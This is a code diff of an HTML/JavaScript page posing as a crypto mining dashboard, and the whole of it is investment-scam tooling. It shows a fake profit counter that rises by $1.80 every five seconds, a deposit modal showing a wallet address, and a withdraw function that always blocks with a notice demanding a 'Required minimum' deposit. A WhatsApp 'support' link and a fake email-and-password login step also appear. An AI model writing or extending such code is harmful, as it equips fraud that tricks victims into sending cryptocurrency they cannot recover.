-            <h3 style="margin-top:0;">Deposit Funds</h3>
-            <div>Copy your wallet address or scan QR code:</div>
-            <div class="address-box">
-              <span id="deposit-addr">${addr}</span>
-              <button class="copy-btn" onclick="__copyDepositAddr()">Copy</button>
-            </div>
-            <img class="qr-img" src="${qrUrl(addr)}" alt="QR code">
-          </div>
-        </div>
-      `;
-    }
-    function withdrawModalView(tokens, selected, closeFn) {
-      return `
-        <div class="modal-bg" onclick="__closeModal(event)">
-          <div class="modal" onclick="event.stopPropagation()">
-            <button class="close" onclick="__closeModal(event)">&times;</button>
-            <h3 style="margin-top:0;">Withdraw Funds</h3>
-            <select class="token-select" id="withdraw-token">
-              <option value="" disabled selected>Select Token</option>
-              ${tokens.map(t => `<option value="${t.symbol}">${t.symbol} (${t.name})</option>`).join('')}
-            </select>
-            <input class="input" id="withdraw-amt" type="number" placeholder="Amount to withdraw" min="0">
-            <input class="input" id="withdraw-addr" placeholder="Recipient address">
-            <button class="confirm-btn" onclick="__confirmWithdraw()">Confirm Withdraw</button>
-            <div class="notice">
-              You can’t withdraw because you are not an active user.<br>
-              Start up with the Required minimum to withdraw your expected profits after 4 hours.<br>
-              <b>Contact support for more info.</b>
-            </div>
-            <a class="support-btn" href="https://wa.me/12722764080" target="_blank">
-              Contact WhatsApp Support
-            </a>
-          </div>
-        </div>
-      `;
-    }
-
-    // --- App State ---
-    let appStep = 0; // 0: cloud fail, 1: login, 2: dashboard
-    let user = null;
-    let code = "";
-    let showCode = false;
-    let miningProfit = 0;
-    let miningInterval = null;
-    let modal = null;
-
-    // --- Main Render ---
-    function render() {
-      let html = "";
-      if (appStep === 0) {
-        html = cloudFailView();
-      } else if (appStep === 1) {
-        html = loginView(showCode, code);
-      } else if (appStep === 2) {
-        html = dashboardView(user, miningProfit);
+    // Mining wheel logic: +$1.80 every 5s for 4 hours, persists in localStorage
+    function setupMiningProfit() {
+      let miningStart = parseInt(localStorage.getItem('cbMiningStart') || '0');
+      let now = Date.now();
+      if (!miningStart || (now - miningStart > 4*60*60*1000)) { // 4 hours
+        miningStart = now;
+        localStorage.setItem('cbMiningStart', miningStart+'');
       }
-      if (modal) html += modal;
-      document.getElementById("root").innerHTML = html;
-      // Attach mining profit update
-      if (appStep === 2) {
-        setTimeout(() => {
-          document.getElementById("profit-amt").textContent = "+$" + miningProfit.toFixed(2);
-        }, 20);
+      function updateProfit() {
+        let elapsed = Math.min(Date.now()-miningStart, 4*60*60*1000);
+        let ticks = Math.floor(elapsed / 5000);
+        let profit = ticks * 1.8;
+        document.getElementById('cb-mining-profit').textContent = '+$' + profit.toFixed(2);
+        document.getElementById('cb-daily-profit').textContent = '+$' + profit.toFixed(2);
       }
+      updateProfit();
+      if(window.cbMiningInterval) clearInterval(window.cbMiningInterval);
+      window.cbMiningInterval = setInterval(()=>{
+        updateProfit();
+        // animate mining wheel rotation
+        let wheel = document.getElementById('cb-mining-wheel');
+        wheel.style.animation = 'none';
+        void wheel.offsetWidth; // reset animation
+        wheel.style.animation = null;
+      }, 5000);
     }
-
-    // --- Event Handlers (exposed globally for inline onclick) ---
-    window.__continueCloudFail = function() {
-      appStep = 1;
-      render();
+    // Deposit modal
+    document.getElementById('cb-deposit-btn').onclick = function() {
+      document.getElementById('cb-deposit-modal').style.display = 'flex';
     };
-    window.__login = function(e) {
-      e.preventDefault();
-      const email = document.getElementById("email").value.trim();
-      const pwd = document.getElementById("password").value.trim();
-      if (email && pwd) {
-        code = randomCode(6);
-        showCode = true;
-        render();
-      }
-    };
-    window.__copyLoginCode = function() {
-      navigator.clipboard.writeText(code);
-      user = { email: document.getElementById("email").value.trim() || "user@example.com" };
-      appStep = 2;
-      showCode = false;
-      render();
-    };
-    window.__openDeposit = function() {
-      modal = depositModalView(WALLET_ADDRESS);
-      render();
-    };
-    window.__copyDepositAddr = function() {
-      const addr = document.getElementById("deposit-addr").innerText;
+    function closeDepositModal() {
+      document.getElementById('cb-deposit-modal').style.display = 'none';
+    }
+    function copyDepositAddress() {
+      let addr = document.getElementById('cb-deposit-address').value;
       navigator.clipboard.writeText(addr);
-      let btn = document.querySelector(".copy-btn");
-      btn.textContent = "Copied!";
-      setTimeout(() => { btn.textContent = "Copy"; }, 1100);
-    };
-    window.__closeModal = function(e) {
-      modal = null;
-      render();
-    };
-    window.__openWithdraw = function(sym) {
-      setTimeout(() => {
-        // pre-select token if clicked from row
-        if (sym && document.getElementById("withdraw-token")) {
-          document.getElementById("withdraw-token").value = sym;
-        }
-      }, 30);
-      modal = withdrawModalView(TOKENS, sym);
-      render();
-    };
-    window.__confirmWithdraw = function() {
-      // Always blocks with notice
-    };
-    window.__logout = function() {
-      user = null; appStep = 1;
-      render();
-    };
-
-    // --- Mining Logic ---
-    function startMining() {
-      function update() {
-        let data = getMiningData();
-        const now = Date.now();
-        let profit = calcMiningProfit(data.start, now);
-        miningProfit = profit;
-        if (profit !== data.current) {
-          data.current = profit;
-          data.lastUpdate = now;
-          setMiningData(data);
-        }
-        if (appStep === 2) {
-          let el = document.getElementById("profit-amt");
-          if (el) el.textContent = "+$" + miningProfit.toFixed(2);
-        }
-      }
-      update();
-      miningInterval = setInterval(update, 5000);
+      alert('Address copied!');
     }
-    // --- Kickoff ---
-    render();
-    startMining();
+    // Withdraw modal logic
+    document.getElementById('cb-withdraw-btn').onclick = function() {
+      document.getElementById('cb-withdraw-modal').style.display = 'flex';
+      buildTokenList();
+      document.getElementById('cb-withdraw-note').style.display = 'none';
+      document.getElementById('cb-withdraw-amount').value = '';
+      document.getElementById('cb-withdraw-address').value = '';
+    }
+    function closeWithdrawModal() {
+      document.getElementById('cb-withdraw-modal').style.display = 'none';
+    }
+    let withdrawSelectedToken = '';
+    function buildTokenList() {
+      let list = document.getElementById('cb-token-list');
+      list.innerHTML = '';
+      TOKENS.forEach(tk => {
+        let el = document.createElement('div');
+        el.className = 'cb-modal-token-item' + (withdrawSelectedToken === tk.symbol ? ' selected' : '');
+        el.innerHTML = `<img src="${tk.img}" class="coin-img" alt="${tk.symbol}">${tk.symbol} — <span style="color:#7f8fa6;font-size:0.98em;">${tk.balance.toLocaleString()}</span>`;
+        el.onclick = function() {
+          withdrawSelectedToken = tk.symbol;
+          buildTokenList();
+        };
+        list.appendChild(el);
+      });
+    }
+    function showWithdrawConfirm() {
+      document.getElementById('cb-withdraw-note').style.display = 'block';
+    }
   </script>
 </body>
 </html>
